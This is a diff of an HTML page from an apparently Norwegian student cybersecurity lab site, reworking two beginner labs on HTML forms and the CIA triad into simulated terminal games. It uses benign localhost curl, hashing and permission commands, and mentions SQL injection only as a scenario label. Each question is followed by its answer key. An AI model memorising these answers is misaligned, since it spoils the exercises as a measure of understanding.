@@ -3,49 +3,15 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>Web Sårbarheter — CyberLab</title>
+<title>Web-sårbarheter — CyberLab</title>
 <link rel="stylesheet" href="../css/style.css?v=13">
 <link rel="stylesheet" href="../css/lab-shared.css?v=13">
-<style>
-.back-link:hover{color:var(--blue)}
-.mod-hero .section-title span{color:var(--blue)}
-.theory-block{background:var(--bg3);border:1px solid var(--border);border-radius:10px;padding:20px 24px;margin-bottom:16px}
-.theory-title{font-size:14px;font-weight:700;color:var(--text);margin-bottom:10px;display:flex;align-items:center;gap:8px}
-.theory-text{font-size:13px;color:var(--text2);line-height:1.75}
-.theory-text p{margin-bottom:8px;font-size:13px}
-.theory-text p:last-child{margin-bottom:0}
-.cia-grid{display:grid;grid-template-columns:1fr 1fr 1fr;gap:10px;margin-top:12px}
-.cia-card{padding:14px;border-radius:8px;text-align:center}
-.cia-c{background:rgba(75,142,255,.1);border:1px solid rgba(75,142,255,.3)}
-.cia-i{background:rgba(0,229,160,.1);border:1px solid rgba(0,229,160,.3)}
-.cia-a{background:rgba(255,181,71,.1);border:1px solid rgba(255,181,71,.3)}
-.cia-letter{font-size:28px;font-weight:800;font-family:var(--mono);margin-bottom:4px}
-.cia-c .cia-letter{color:var(--blue)}.cia-i .cia-letter{color:var(--green)}.cia-a .cia-letter{color:var(--amber)}
-.cia-word{font-size:12px;font-weight:700;margin-bottom:6px}
-.cia-desc{font-size:11px;color:var(--text2);line-height:1.5}
-.code-block{background:#05070a;border:1px solid var(--border);border-radius:7px;padding:14px 16px;font-family:var(--mono);font-size:12px;line-height:1.9;margin:10px 0;overflow-x:auto}
-.sql-kw{color:#c084fc}.sql-str{color:#4ade80}.sql-com{color:#6b7280}
-.payload{color:#f87171;font-weight:700;background:rgba(255,92,92,.1);padding:1px 4px;border-radius:3px}
-.code-editor{display:grid;grid-template-columns:1fr 1fr;border:1px solid var(--border);border-radius:8px;overflow:hidden}
-.editor-pane{background:#05070a;padding:14px}
-.editor-pane textarea{width:100%;background:transparent;border:none;outline:none;color:var(--text);font-family:var(--mono);font-size:12px;line-height:1.8;resize:none;min-height:160px}
-.editor-pane-label{font-size:10px;font-weight:700;letter-spacing:.1em;text-transform:uppercase;color:var(--text3);margin-bottom:8px;font-family:var(--mono)}
-.preview-pane{background:#fff;border-left:1px solid var(--border)}
-.preview-pane-label{font-size:10px;font-weight:700;letter-spacing:.1em;text-transform:uppercase;color:#888;padding:8px 14px;border-bottom:1px solid #e5e7eb;background:#f9fafb}
-.preview-frame{padding:14px;min-height:160px}
-.mini-quiz{background:var(--bg4);border:1px solid var(--border2);border-radius:8px;padding:16px;margin-top:14px}
-.mini-quiz-title{font-family:var(--mono);font-size:10px;font-weight:700;letter-spacing:.1em;text-transform:uppercase;color:var(--text3);margin-bottom:10px}
-.quiz-q{font-size:13px;color:var(--text);font-weight:600;margin-bottom:8px}
-.quiz-opts{display:flex;flex-direction:column;gap:6px}
-.quiz-opt{background:transparent;border:1px solid var(--border2);border-radius:6px;padding:8px 14px;font-size:12px;color:var(--text2);cursor:pointer;text-align:left;transition:all .18s;font-family:var(--sans)}
-.quiz-opt:hover{border-color:var(--blue);color:var(--blue);background:var(--blue-dim)}
-.quiz-opt.correct{border-color:var(--green);color:var(--green);background:var(--green-dim)}
-.quiz-opt.wrong{border-color:var(--red);color:var(--red);background:var(--red-dim)}
-.quiz-fb{font-size:12px;margin-top:8px;line-height:1.6;display:none}
-.quiz-fb.show{display:block}
-</style>
+<link rel="stylesheet" href="../css/enkel.css?v=5">
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+<link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;600;700&amp;family=Bricolage+Grotesque:wght@300;400;500;600;700;800&amp;display=swap" rel="stylesheet">
 </head>
-<body class="page">
+<body class="page enkel">
 <nav class="nav">
   <div class="nav-logo"><span class="bracket">[</span>CyberLab<span class="bracket">]</span></div>
   <div class="nav-links">
@@ -58,434 +24,702 @@
 </nav>
 
 <div class="container-sm page" style="padding-top:40px;padding-bottom:80px">
-  <a href="https://cybersikkerhet-gokstad.github.io/CyberLab/labber.html" class="back-link">← Tilbake</a>
-  <div class="mod-hero">
-    <div class="section-eyebrow">Læringsressurs</div>
-    <div class="section-title">Web <span>Sårbarheter</span></div>
-    <p class="section-desc">Fra HTML-grunnlag til SQL Injection, XSS og forsvarsteknikker. Steg for steg, med teori og praksis i hver lab.</p>
-    <div style="margin-top:20px;display:flex;gap:10px;flex-wrap:wrap;align-items:center">
-      <span class="badge badge-module">11 labber</span>
-      <span class="badge badge-easy">Lett: Lab 1–3</span>
-      <span class="badge badge-medium">Middels: Lab 4–6</span>
-      <span class="badge badge-hard">Vanskelig: Lab 7–11</span>
-    </div>
-  </div>
+<a href="https://cybersikkerhet-gokstad.github.io/CyberLab/labber.html" class="back-link">&larr; Tilbake</a>
 
-  <div class="setup-box ok">
-    <div class="setup-title">✅ Alt kj&oslash;rer her i nettleseren</div>
-    <ul class="setup-list"><li>Du trenger <strong>ingen virtuelle maskiner</strong> og ingen installasjon.</li><li>Terminalen og nettsiden i oppgavene er simulert p&aring; denne siden.</li><li>Fremdriften lagres lokalt i nettleseren din.</li></ul>
-  </div>
+<div class="mod-hero">
+  <div class="section-eyebrow">Emne 1 &middot; Leksjon 22 og 25</div>
+  <div class="section-title">Web-sårbarheter</div>
+  <p class="section-desc">Hva en nettside er laget av, hva et skjema faktisk sender, og hvordan det du skriver kan bli til et angrep. Elleve små spill, og så noen spørsmål etter hvert.</p>
+</div>
 
-  <div class="progress-wrap" style="margin-bottom:28px">
-    <div class="progress-label"><span>Fremgang</span><span id="progressLabel">0 / 11 fullført</span></div>
-    <div class="progress-track"><div class="progress-fill" id="progressFill" style="width:0%"></div></div>
-  </div>
-  <div class="filter-row">
-    <button class="filter-pill active-all" onclick="setFilter('all',this)">Alle</button>
-    <button class="filter-pill" onclick="setFilter('easy',this)">Lett</button>
-    <button class="filter-pill" onclick="setFilter('medium',this)">Middels</button>
-    <button class="filter-pill" onclick="setFilter('hard',this)">Vanskelig</button>
-  </div>
-  <div class="tasks">
+<div class="e-strip">
+  <span>🎮 Lek først</span><span>💻 Så terminalen</span><span>✍️ Svar etterpå</span><span>💡 Hint er gratis</span><span>☕ Pauser er lov, siden husker hvor du var</span>
+</div>
 
+<details class="e-ordliste">
+  <summary>📖 Glemt et ord? Ordliste</summary>
+  <dl>
+    <dt>HTML</dt><dd>Skjelettet i en nettside: overskrifter, felt, knapper.</dd>
+    <dt>CSS</dt><dd>Klærne: farger, størrelser og plassering.</dd>
+    <dt>Element</dt><dd>Én bit av siden, skrevet med tagger. <code>&lt;button&gt;Logg inn&lt;/button&gt;</code></dd>
+    <dt>Skjema (form)</dt><dd>Samler feltene og sender dem til serveren.</dd>
+    <dt>GET / POST</dt><dd>GET henter en side. POST sender data, for eksempel et skjema.</dd>
+    <dt>Header</dt><dd>En linje med info øverst i en forespørsel eller et svar.</dd>
+    <dt>Cookie</dt><dd>Lappen nettleseren viser fram for å være innlogget.</dd>
+    <dt>Payload</dt><dd>Det angriperen skriver inn for å lure systemet.</dd>
+    <dt>Injection</dt><dd>Kode der programmet ventet data.</dd>
+    <dt>XSS</dt><dd>JavaScript som sniker seg inn i en side og kjører hos offeret.</dd>
+    <dt>CIA</dt><dd>Konfidensialitet, integritet, tilgjengelighet.</dd>
+    <dt>Prepared statement</dt><dd>SQL med <code>?</code> der verdiene skal inn. Input blir alltid data.</dd>
+    <dt>CSP</dt><dd>En header som sier hvilke script nettleseren får kjøre.</dd>
+    <dt>Escaping</dt><dd>Å skrive <code>&lt;</code> som <code>&amp;lt;</code>, så det vises i stedet for å tolkes.</dd>
+  </dl>
+</details>
+
+<div class="progress-wrap">
+  <div class="progress-label"><span>Fremdrift</span><span id="progressLabel">0 / 0 fullf&oslash;rt</span></div>
+  <div class="progress-track"><div class="progress-fill" id="progressFill"></div></div>
+</div>
+
+<div class="filter-row">
+  <button class="filter-pill active-all" onclick="setFilter('all',this)">Alle</button>
+  <button class="filter-pill" onclick="setFilter('easy',this)">Lett</button>
+  <button class="filter-pill" onclick="setFilter('medium',this)">Middels</button>
+  <button class="filter-pill" onclick="setFilter('hard',this)">Vanskelig</button>
+</div>
+
+<div class="tasks">
+
+<!-- ═══════════════════════ 1 · HTML OG CSS ═══════════════════════ -->
 <div class="lab-card" id="web-1" data-level="easy">
-  <div class="lab-header" onclick="toggleTask(this)"><span class="lab-num">01</span><span class="lab-title">HTML &amp; CSS — slik er nettsider bygget</span><div class="lab-meta"><span class="badge badge-easy">Lett</span><span class="lab-chev">▶</span></div></div>
-  <div class="lab-body"><div class="lab-flow">
-      <div class="level-badge lb-1">Nivå 1 — HTML &amp; CSS</div>
-      <div class="theory-block"><div class="theory-title">📄 Hva er HTML?</div><div class="theory-text"><p>HTML (HyperText Markup Language) er språket alle nettsider er bygget med. Det definerer strukturen — hva som er en overskrift, en knapp, et inputfelt, en lenke.</p></div></div>
-      <div class="theory-block"><div class="theory-title">🎨 Hva er CSS?</div><div class="theory-text"><p>CSS styrer utseendet — farger, skriftstørrelser, layout og animasjoner. HTML = skjellettet, CSS = klærne.</p></div></div>
-      <div><div class="obj-title">Mål</div>
-        <div class="obj-item"><div class="obj-num">1</div><div class="obj-text">Rediger HTML til høyre og se hva som skjer i forhåndsvisningen</div></div>
-        <div class="obj-item"><div class="obj-num">2</div><div class="obj-text">Legg til et <code>&lt;input&gt;</code>-felt og en <code>&lt;button&gt;</code></div></div>
-        <div class="obj-item"><div class="obj-num">3</div><div class="obj-text">Forklar: hva er <code>&lt;form&gt;</code> og hvorfor er det viktig for sikkerhet?</div></div>
-      </div>
-      <div class="mini-quiz"><div class="mini-quiz-title">Kunnskapssjekk</div><div class="quiz-q">Hva er forskjellen på HTML og CSS?</div><div class="quiz-opts"><button class="quiz-opt" onclick="mq(this,false)">HTML styler utseendet, CSS definerer strukturen</button><button class="quiz-opt" onclick="mq(this,true)">HTML definerer struktur, CSS styrer utseendet</button><button class="quiz-opt" onclick="mq(this,false)">De er det samme, bare forskjellige navn</button></div><div class="quiz-fb"></div></div>
-        <div class="term-block"><div class="fake-browser" style="flex-direction:column">
-        <div class="fake-bar"><div class="fake-dots"><div class="fdot fdot-r"></div><div class="fdot fdot-y"></div><div class="fdot fdot-g"></div></div><div class="fake-url">Live HTML editor</div></div>
-        <div style="flex:1;display:flex;flex-direction:column">
-          <div class="code-editor" style="flex:1;border:none;border-radius:0">
-            <div class="editor-pane" style="flex:1"><div class="editor-pane-label">HTML</div><textarea id="html-editor" oninput="updatePreview()" spellcheck="false">&lt;h2 style="color:#4b8eff"&gt;Min første nettside&lt;/h2&gt;
-&lt;p&gt;Hei! Dette er et avsnitt.&lt;/p&gt;
-&lt;p style="color:red"&gt;Rød tekst&lt;/p&gt;
-&lt;button style="padding:8px 16px;background:#4b8eff;color:white;border:none;border-radius:4px"&gt;Klikk meg!&lt;/button&gt;</textarea></div>
-            <div class="preview-pane" style="flex:1"><div class="preview-pane-label">Forhåndsvisning</div><div class="preview-frame" id="html-preview"></div></div>
-          </div>
-          <div style="background:#05070a;padding:10px 16px;border-top:1px solid var(--border)"><div style="font-size:11px;color:var(--text3);font-family:var(--mono)">Rediger til venstre — forhåndsvisningen oppdateres live</div></div>
-        </div>
-      </div></div><div class="ans-block">
-          <div class="obj-title">Svar</div>
+<div class="lab-header" onclick="toggleTask(this)">
+  <span class="lab-num">01</span>
+  <span class="lab-title">HTML &amp; CSS — slik er nettsider bygget</span>
+  <div class="lab-meta"><span class="badge badge-easy">Lett</span><span class="lab-chev">&#9654;</span></div>
+</div>
+<div class="lab-body"><div class="lab-flow">
+<div class="level-badge lb-1">Nivå 1 — HTML &amp; CSS</div>
+<p class="e-hook">Hver innloggingsside du har sett, er bare en tekstfil 📄 Her er en. Finn bitene som faktisk sender noe!</p>
+
+<div class="e-spill" data-spill="klikk" data-tittel="🔎 Finn skjemaet" data-oppgave="Klikk på de <b>fire</b> bitene som lager skjemaet: selve skjemaet, de to feltene og knappen.">
+<pre>&lt;!DOCTYPE html&gt;
+&lt;html&gt;
+&lt;head&gt;
+  <span class="kl" data-forklar="Teksten som står i fanen øverst i nettleseren. Sender ingenting.">&lt;title&gt;Logg inn&lt;/title&gt;</span>
+  <span class="kl" data-forklar="Dette er CSS, klærne 👗 Den bestemmer farger. Ikke hva som sendes.">&lt;style&gt; h1 { color: navy; } &lt;/style&gt;</span>
+&lt;/head&gt;
+&lt;body&gt;
+  <span class="kl" data-forklar="En overskrift. Bare noe å se på.">&lt;h1&gt;Velkommen tilbake&lt;/h1&gt;</span>
+  <span class="kl" data-rett data-forklar="Skjemaet! action = hvor dataene sendes. method = hvordan.">&lt;form action="/login" method="post"&gt;</span>
+    <span class="kl" data-rett data-forklar="Et felt. name=&quot;bruker&quot; blir navnet på verdien som sendes.">&lt;input name="bruker"&gt;</span>
+    <span class="kl" data-rett data-forklar="Et felt til. type=&quot;password&quot; viser prikker på skjermen, men verdien sendes som vanlig tekst.">&lt;input name="passord" type="password"&gt;</span>
+    <span class="kl" data-rett data-forklar="Knappen som sender skjemaet av gårde 🚀">&lt;button&gt;Logg inn&lt;/button&gt;</span>
+  &lt;/form&gt;
+&lt;/body&gt;
+&lt;/html&gt;</pre>
+</div>
+
+<div class="e-fagord"><span class="t">📌 Fagord</span>
+<b>HTML</b> er skjelettet: hvilke biter siden har. <b>CSS</b> er klærne: farger og plassering.<br>
+Hver bit er et <b>element</b>, skrevet med <b>tagger</b> som <code>&lt;input&gt;</code>. Elementet <code>&lt;form&gt;</code> (skjema) samler feltene og sender dem til serveren. <code>name=</code> blir navnet på hver verdi.
+</div>
+<p class="e-sikker">🔐 Prikkene i passordfeltet er bare pynt på skjermen. Uten <b>https</b> reiser passordet som vanlig tekst.</p>
+
+<div class="e-spill" data-spill="terminal">
+<div class="tm-o" data-cmd="cat login.html" data-mal="Se hele siden som tekst:"><template class="ut">&lt;!DOCTYPE html&gt;
+&lt;html&gt;
+&lt;head&gt;
+  &lt;title&gt;Logg inn&lt;/title&gt;
+  <span class="h4">&lt;style&gt;
+    h1 { color: navy; }
+    button { background: green; }
+  &lt;/style&gt;</span>
+&lt;/head&gt;
+&lt;body&gt;
+  &lt;h1&gt;Velkommen tilbake&lt;/h1&gt;
+  <span class="h1">&lt;form action="/login" method="post"&gt;</span>
+    &lt;input name="<span class="h2">bruker</span>" placeholder="Brukernavn"&gt;
+    &lt;input name="<span class="h2">passord</span>" type="password"&gt;
+    &lt;button&gt;Logg inn&lt;/button&gt;
+  <span class="h1">&lt;/form&gt;</span>
+&lt;/body&gt;
+&lt;/html&gt;</template><template class="forklar"><ul class="e-forklar"><li><span class="m h4"></span><span>CSS-en, klærne</span></li><li><span class="m h1"></span><span>skjemaet starter og slutter</span></li><li><span class="m h2"></span><span>navnene på verdiene som sendes</span></li></ul></template></div>
+<div class="tm-o" data-cmd="python3 -m http.server 8000" data-mal="Gjør mappa di til en liten webserver:"><template class="ut">Serving HTTP on 0.0.0.0 port <span class="h1">8000</span> (http://0.0.0.0:8000/) ...</template><template class="forklar"><p>Serveren står og venter på port <b>8000</b>. La den stå, og åpne en ny fane med <b>Ctrl + Shift + T</b> for resten av oppdragene.</p></template></div>
+<div class="tm-o" data-cmd="curl -s http://localhost:8000/login.html | grep -i &quot;&lt;form&quot;" data-alias="curl -s localhost:8000/login.html | grep -i &quot;&lt;form&quot;|curl -s http://localhost:8000/login.html | grep -i '&lt;form'|curl -s localhost:8000/login.html | grep -i '&lt;form'" data-mal="Hent siden som nettleseren ville gjort, og plukk ut skjema-linja:"><template class="ut">  &lt;form action="<span class="h2">/login</span>" method="<span class="h1">post</span>"&gt;</template><template class="forklar"><ul class="e-forklar"><li><span class="m h2"></span><span>hvor skjemaet sendes</span></li><li><span class="m h1"></span><span>hvordan: POST = «send data»</span></li></ul><p><code>curl</code> henter en side uten å vise den fram. <code>grep -i</code> plukker ut linjene med <code>&lt;form</code>.</p></template></div>
+<div class="tm-o" data-cmd="curl -v -d &quot;bruker=kali&amp;passord=hemmelig&quot; http://localhost:8000/login" data-alias="curl -v -d &quot;bruker=kali&amp;passord=hemmelig&quot; localhost:8000/login|curl -d &quot;bruker=kali&amp;passord=hemmelig&quot; -v http://localhost:8000/login" data-mal="Send skjemaet selv, og se hva som faktisk går over nettet:"><template class="ut"><span class="dim">*   Trying 127.0.0.1:8000...
+* Connected to localhost (127.0.0.1) port 8000</span>
+&gt; <span class="h1">POST</span> /login HTTP/1.1
+&gt; Host: localhost:8000
+&gt; User-Agent: curl/8.5.0
+&gt; Accept: */*
+&gt; <span class="h2">Content-Length: 28</span>
+&gt; <span class="h4">Content-Type: application/x-www-form-urlencoded</span>
+&gt;
+<span class="dim">* HTTP 1.0, assume close after body</span>
+&lt; HTTP/1.0 <span class="h3">501 Unsupported method ('POST')</span>
+&lt; Server: SimpleHTTP/0.6 Python/3.13.16
+&lt; Content-Type: text/html;charset=utf-8
+&lt;
+<span class="dim">&lt;!DOCTYPE HTML&gt; … Error code: 501 …</span></template><template class="forklar"><ul class="e-forklar"><li><span class="m h1"></span><span>metoden, som i skjemaet</span></li><li><span class="m h2"></span><span>størrelsen på dataene: <code>bruker=kali&amp;passord=hemmelig</code> er 28 tegn</span></li><li><span class="m h4"></span><span>«dette er utfylte skjemafelt»: <code>navn=verdi</code>, skilt med <code>&amp;</code></span></li><li><span class="m h3"></span><span>serveren vår deler bare ut filer, så den sier nei. Helt greit, vi ville bare se hva som ble sendt</span></li></ul><p><code>&gt;</code> = det du sendte. <code>&lt;</code> = det du fikk tilbake. <code>-d</code> = «send disse dataene».</p></template></div>
+</div>
+
+<div class="ans-block les"><div class="obj-title">🔎 Les av øve-terminalen</div>
+<div class="ans-row" data-p="1" data-a="post"><span class="ans-q">Hvilken metode (method) bruker skjemaet?</span><input class="ans-in" placeholder="ett ord"><span class="ans-mark"></span><button class="submit-btn" onclick="clSubmit(this)">Svar</button><div class="ah"><button class="ah-btn" onclick="aTip(this)">&#9654; Hint</button><div class="ah-box tip">Den gule biten i oppdrag 3.</div><button class="ah-btn sv fasit-btn" onclick="aTip(this)">&#9654; Fasit</button><div class="ah-box sv">post</div></div></div>
+<div class="ans-row" data-p="1" data-a="28"><span class="ans-q">Hvor mange byte data sendte skjemaet?</span><input class="ans-in" placeholder="et tall"><span class="ans-mark"></span><button class="submit-btn" onclick="clSubmit(this)">Svar</button><div class="ah"><button class="ah-btn" onclick="aTip(this)">&#9654; Hint</button><div class="ah-box tip">Se på <code>Content-Length</code> i oppdrag 4.</div><button class="ah-btn sv fasit-btn" onclick="aTip(this)">&#9654; Fasit</button><div class="ah-box sv">28</div></div></div>
+</div>
+
+<div class="e-kali"><b class="t">🐉 Nå på ekte Kali</b>Lag fila med <code>nano login.html</code> og skriv inn siden fra oppdrag 1. Start serveren i én fane, og kjør <code>curl</code> i en ny fane (<b>Ctrl + Shift + T</b>). Åpne også <code>http://localhost:8000/login.html</code> i Firefox og trykk <b>Ctrl + U</b>. Da ser du kildekoden til siden. Stopp serveren med <b>Ctrl + C</b>.<p class="e-win">Windows: <code>python -m http.server 8000</code> og <code>curl.exe -v -d "bruker=kali&amp;passord=hemmelig" http://localhost:8000/login</code></p></div>
+
+<div class="ans-block"><div class="obj-title">✍️ Din tur</div>
           <div class="ans-row" data-p="1" data-a="&lt;form&gt;|form"><span class="ans-q">Hvilket HTML-element samler inn og sender brukerdata?</span><input class="ans-in" placeholder="et element"><span class="ans-mark"></span><button class="submit-btn" onclick="clSubmit(this)">Svar</button>
-          <div class="ah"><button class="ah-btn" onclick="aTip(this)">&#9654; Hint</button><div class="ah-box tip">Elementet omslutter inndatafeltene.</div><button class="ah-btn sv fasit-btn" onclick="aTip(this)">&#9654; Fasit</button><div class="ah-box sv">form</div></div></div>
-        </div>
-
-      <div class="complete-banner" id="done-web-1"><span>✓</span> Lab 1 fullført!</div>
-    </div></div>
+          <div class="ah"><button class="ah-btn" onclick="aTip(this)">&#9654; Hint</button><div class="ah-box tip">Hvilken tagg sto rundt begge feltene i klikkespillet?</div><button class="ah-btn sv fasit-btn" onclick="aTip(this)">&#9654; Fasit</button><div class="ah-box sv">form</div></div></div>
+</div>
+</div></div>
 </div>
 
+<!-- ═══════════════════════ 2 · CIA ═══════════════════════ -->
 <div class="lab-card" id="web-2" data-level="easy">
-  <div class="lab-header" onclick="toggleTask(this)"><span class="lab-num">02</span><span class="lab-title">CIA-triaden — grunnmuren i cybersikkerhet</span><div class="lab-meta"><span class="badge badge-easy">Lett</span><span class="lab-chev">▶</span></div></div>
-  <div class="lab-body"><div class="lab-flow">
-      <div class="level-badge lb-1">Nivå 2 — CIA-triaden</div>
-      <div class="theory-block"><div class="theory-title">🔐 CIA-triaden</div><div class="theory-text"><p>All sikkerhet handler om å beskytte tre ting. CIA er ikke etterretningsorganisasjonen — det er de tre grunnpilarene i informasjonssikkerhet. Alle angrep bryter én eller flere av disse.</p></div></div>
-      <div><div class="obj-title">Mål</div>
-        <div class="obj-item"><div class="obj-num">1</div><div class="obj-text">Les CIA-kortene til høyre og forstå hva hver bokstav betyr</div></div>
-        <div class="obj-item"><div class="obj-num">2</div><div class="obj-text">Klikk på eksemplene og se hvilken del av CIA som brytes</div></div>
-        <div class="obj-item"><div class="obj-num">3</div><div class="obj-text">Svar på kunnskapssjekken</div></div>
-      </div>
-      <div class="mini-quiz"><div class="mini-quiz-title">Kunnskapssjekk</div><div class="quiz-q">SQL injection henter ut alle passord. Hvilken del av CIA brytes primært?</div><div class="quiz-opts"><button class="quiz-opt" onclick="mq(this,true)">Konfidensialitet — uvedkommende får tilgang til hemmelig data</button><button class="quiz-opt" onclick="mq(this,false)">Integritet — dataene er endret</button><button class="quiz-opt" onclick="mq(this,false)">Tilgjengelighet — systemet er nede</button></div><div class="quiz-fb"></div></div>
-        <div class="term-block"><div class="fake-browser" style="flex-direction:column">
-        <div class="fake-bar"><div class="fake-dots"><div class="fdot fdot-r"></div><div class="fdot fdot-y"></div><div class="fdot fdot-g"></div></div><div class="fake-url">CIA-triaden</div></div>
-        <div class="site-wrap"><div class="ts"><div class="ts-nav" style="background:#1e3a5f"><span class="ts-logo">🔐 CIA-triaden</span></div><div class="ts-body">
-          <div class="cia-grid">
-            <div class="cia-card cia-c"><div class="cia-letter">C</div><div class="cia-word" style="color:var(--blue)">Konfidensialitet</div><div class="cia-desc">Kun autoriserte skal lese data.</div></div>
-            <div class="cia-card cia-i"><div class="cia-letter">I</div><div class="cia-word" style="color:var(--green)">Integritet</div><div class="cia-desc">Data skal ikke endres uten tillatelse.</div></div>
-            <div class="cia-card cia-a"><div class="cia-letter">A</div><div class="cia-word" style="color:var(--amber)">Tilgjengelighet</div><div class="cia-desc">Systemet skal være tilgjengelig.</div></div>
-          </div>
-          <div style="margin-top:12px;display:flex;flex-direction:column;gap:6px">
-            <button onclick="ciaEx('c')" class="ts-btn" style="background:#1e3a5f;font-size:12px;text-align:left;padding:10px 14px">SQL Injection dumper alle passord</button>
-            <button onclick="ciaEx('i')" class="ts-btn" style="background:#065f46;font-size:12px;text-align:left;padding:10px 14px">SQL Injection endrer en saldo til 0</button>
-            <button onclick="ciaEx('a')" class="ts-btn" style="background:#92400e;font-size:12px;text-align:left;padding:10px 14px">SQL Injection sletter hele databasen</button>
-          </div>
-          <div id="cia-result" style="display:none;margin-top:12px;padding:12px 14px;border-radius:8px;font-size:13px;line-height:1.6"></div>
-        </div></div></div>
-      </div></div><div class="ans-block">
-          <div class="obj-title">Svar</div>
+<div class="lab-header" onclick="toggleTask(this)">
+  <span class="lab-num">02</span>
+  <span class="lab-title">CIA-triaden — grunnmuren i cybersikkerhet</span>
+  <div class="lab-meta"><span class="badge badge-easy">Lett</span><span class="lab-chev">&#9654;</span></div>
+</div>
+<div class="lab-body"><div class="lab-flow">
+<div class="level-badge lb-1">Nivå 2 — CIA-triaden</div>
+<p class="e-hook">Hver eneste sikkerhetsnyhet du leser handler om én av tre ting som gikk galt. Bare tre! Finn ut hvilken 🎯</p>
+
+<div class="e-spill" data-spill="lyn" data-tittel="⚡ Hva gikk galt?" data-knapper="🔵 C: hemmelig ble lest|🟢 I: noe ble endret|🟡 A: ingen kommer til">
+  <div class="ly-item" data-svar="0" data-hvorfor="Hemmelige data havnet hos noen som ikke skulle se dem.">SQL injection dumper alle passordene 🔓</div>
+  <div class="ly-item" data-svar="1" data-hvorfor="Tallet er endret uten lov. Dataene stemmer ikke lenger.">SQL injection endrer saldoen din til 0 kr 💸</div>
+  <div class="ly-item" data-svar="2" data-hvorfor="Dataene er borte, og ingen får brukt systemet.">SQL injection sletter hele databasen 💥</div>
+  <div class="ly-item" data-svar="0" data-hvorfor="Noen leste noe som var ment for deg alene.">Naboen leser e-posten din over skulderen 👀</div>
+  <div class="ly-item" data-svar="2" data-hvorfor="Alt er hemmelig og riktig, men ingen kommer inn.">Nettbanken er nede hele julaften etter et angrep 🎄</div>
+  <div class="ly-item" data-svar="1" data-hvorfor="Karakteren er endret uten lov.">En elev endrer karakteren sin fra D til A i skolesystemet 📝</div>
+</div>
+
+<div class="e-fagord"><span class="t">📌 Fagord</span>
+De tre heter <b>CIA-triaden</b>:<br>
+🔵 <b>C</b>onfidentiality = <b>konfidensialitet</b>: bare de som skal, får lese.<br>
+🟢 <b>I</b>ntegrity = <b>integritet</b>: data endres ikke uten lov.<br>
+🟡 <b>A</b>vailability = <b>tilgjengelighet</b>: systemet virker når du trenger det.
+</div>
+<p class="e-sikker">🕵️ Fun fact: CIA her har ingenting med den amerikanske etterretningstjenesten å gjøre.</p>
+
+<div class="e-spill" data-spill="terminal">
+<div class="tm-o" data-cmd="ls -l hemmelig.txt" data-mal="Hvem får lese den hemmelige fila? 🔵"><template class="ut"><span class="h1">-rw-------</span> 1 <span class="h2">kali</span> kali 39 Oct  7 18:29 hemmelig.txt</template><template class="forklar"><ul class="e-forklar"><li><span class="m h1"></span><span>rettighetene: <code>rw</code> for eieren, strek-strek-strek for alle andre</span></li><li><span class="m h2"></span><span>eieren</span></li></ul><p>Bare eieren kan lese og skrive. Det er <b>konfidensialitet</b> i praksis 🔵</p></template></div>
+<div class="tm-o" data-cmd="sha256sum karakterer.csv" data-mal="Ta fingeravtrykket av karakterfila 🟢" data-alias="sha256sum ./karakterer.csv"><template class="ut"><span class="h1">6c8d110373177a629a693b67cbcc20425af3550a4e671cf93b5d3a00205cf63c</span>  karakterer.csv</template><template class="forklar"><p>En <b>hash</b> er et fingeravtrykk av fila. Endres én bokstav, blir hele avtrykket et annet.</p></template></div>
+<div class="tm-o" data-cmd="sha256sum karakterer.csv" data-mal="Noen har vært inne i fila 😬 Ta fingeravtrykket igjen." data-alias="sha256sum ./karakterer.csv" data-skjult data-hint="Samme kommando som i oppdrag 2."><template class="ut"><span class="h1">603f097ad51fbf4e4bf3a21fc846003268eaf13afda7d7c8b8afb9af9eff8969</span>  karakterer.csv</template><template class="forklar"><p>Et helt annet avtrykk! Noe i fila er endret. <b>Integriteten</b> er brutt 🟢</p></template></div>
+<div class="tm-o" data-cmd="cat karakterer.csv" data-mal="Hva ble endret? Se inni fila." data-skjult data-hint="Kommandoen som viser innholdet i en fil. Tre bokstaver."><template class="ut">navn,karakter
+Ola,C
+Kari,B
+<span class="h1">Lars,A</span></template><template class="forklar"><p>Lars hadde D. Nå står det A 🤔</p></template></div>
+</div>
+
+<div class="ans-block les"><div class="obj-title">🔎 Les av øve-terminalen</div>
+<div class="ans-row" data-p="1" data-a="nei"><span class="ans-q">Var de to fingeravtrykkene av karakterer.csv like? ja eller nei</span><input class="ans-in" placeholder="ja / nei"><span class="ans-mark"></span><button class="submit-btn" onclick="clSubmit(this)">Svar</button><div class="ah"><button class="ah-btn" onclick="aTip(this)">&#9654; Hint</button><div class="ah-box tip">Sammenlign de første tegnene i oppdrag 2 og 3.</div><button class="ah-btn sv fasit-btn" onclick="aTip(this)">&#9654; Fasit</button><div class="ah-box sv">nei</div></div></div>
+<div class="ans-row" data-p="1" data-a="lars"><span class="ans-q">Hvem har fått en ny karakter?</span><input class="ans-in" placeholder="et navn"><span class="ans-mark"></span><button class="submit-btn" onclick="clSubmit(this)">Svar</button><div class="ah"><button class="ah-btn" onclick="aTip(this)">&#9654; Hint</button><div class="ah-box tip">Den gule linja i oppdrag 4.</div><button class="ah-btn sv fasit-btn" onclick="aTip(this)">&#9654; Fasit</button><div class="ah-box sv">Lars</div></div></div>
+</div>
+
+<div class="e-kali"><b class="t">🐉 Nå på ekte Kali</b>Lag en fil med <code>nano karakterer.csv</code>, ta fingeravtrykket, endre én bokstav, og ta det igjen. Avtrykket ditt blir et annet enn her. Det er helt riktig! Gjør en fil privat med <code>chmod 600 hemmelig.txt</code>.<p class="e-win">Windows (PowerShell): <code>Get-FileHash karakterer.csv</code></p></div>
+
+<div class="ans-block"><div class="obj-title">✍️ Din tur</div>
           <div class="ans-row" data-p="1" data-a="Konfidensialitet"><span class="ans-q">Hva står C-en i CIA for?</span><input class="ans-in" placeholder="ett ord"><span class="ans-mark"></span><button class="submit-btn" onclick="clSubmit(this)">Svar</button>
-          <div class="ah"><button class="ah-btn" onclick="aTip(this)">&#9654; Hint</button><div class="ah-box tip">Den handler om at uvedkommende ikke skal f&aring; se innholdet.</div><button class="ah-btn sv fasit-btn" onclick="aTip(this)">&#9654; Fasit</button><div class="ah-box sv">Konfidensialitet</div></div></div>
